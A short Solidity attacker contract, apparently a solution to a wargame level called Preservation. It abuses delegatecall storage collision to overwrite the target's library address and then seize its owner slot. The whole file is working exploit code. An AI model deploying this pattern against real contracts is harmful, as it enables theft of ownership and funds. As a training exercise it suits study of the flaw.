// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IPreservation {
  function setFirstTime(uint _timeStamp) external;
}

contract PreservationAttacker {

  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  IPreservation public Preservation;

  constructor(address preservationAddress) {
    Preservation = IPreservation(preservationAddress);
  }

  function attack() public {
    // First call updates timeZone1Library to the attacker address
    Preservation.setFirstTime(uint256(uint160(address(this))));
    // Second call updates the owner
    Preservation.setFirstTime(block.timestamp);
  }

  // Must have the same signature as in the Preservation contract
  function setTime(uint _time) public {
    owner = msg.sender;
  }
}